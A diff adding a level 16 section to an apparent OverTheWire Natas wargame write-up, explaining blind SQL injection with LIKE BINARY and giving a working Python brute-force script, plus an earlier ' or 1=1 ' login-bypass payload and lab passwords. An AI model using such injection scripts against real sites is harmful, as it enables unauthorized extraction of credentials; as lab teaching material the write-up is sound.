@@ -228,3 +228,49 @@ Check the source code. The login is based on mysql database query. We can do typ
 
 Make an HTTP GET request to bypass the login check. The password is `" or 1=1 -- 1`. The last character '1' is needed because we need a space after the comment symbol '--'. \
 ![Level 15 - 2](images/level_15-2.png)
+
+## level 16
+passwd: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
+### solution
+Check the source code. At first glance, there is no output we can make direct use of. Thus we can only use brute force attack to indirectly obtain the password. Luckily, we do have some information about the password: (i) it consists of characters in 'a-zA-Z0-9' (ii) it is of length 32. \
+![Level 16 - 3](images/level_16-3.png)
+
+Check the existence of user `natas16`. \
+![Level 16 - 1](images/level_16-1.png)
+![Level 16 - 2](images/level_16-2.png)
+
+If we execute following SQL query:
+```sql
+SELECT * from users where username="natas16" and password LIKE BINARY "W%"
+```
+The result will give us the information about whether the password begins with 'W'. The keyword `BINARY` instructs the query to be case-sensitive. We can obtain the character at a specific postion by guessing at most 62 times (the size of 'a-zA-Z0-9'). So we only need to make 62*32 = 1984 HTTP requests at most. That's affordable and can be further optimized by obtaining the dictionary of the password beforehand using pattern `"%<char>%"`.
+
+Below is a python implementation with full dictionary:
+```python
+import string
+import requests
+
+passwd_dict = string.digits + string.ascii_letters
+auth_username = 'natas15'
+auth_password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
+exists_str = 'This user exists.'
+passwd = ''
+
+url = 'http://natas15.natas.labs.overthewire.org/index.php'
+for i in range(0, 32):
+    for char in passwd_dict:
+        params = {
+            'username': 'natas16" and password LIKE BINARY "{}{}%" -- ;'.format(passwd, char),
+            'debug'   : True
+        }
+        r = requests.get(url, params=params, auth=(auth_username,auth_password))
+
+        if exists_str in r.text:
+            passwd += char
+            print(passwd)
+            break
+```
+
+The result:
+![Level 16 - 4](images/level_16-4.png)
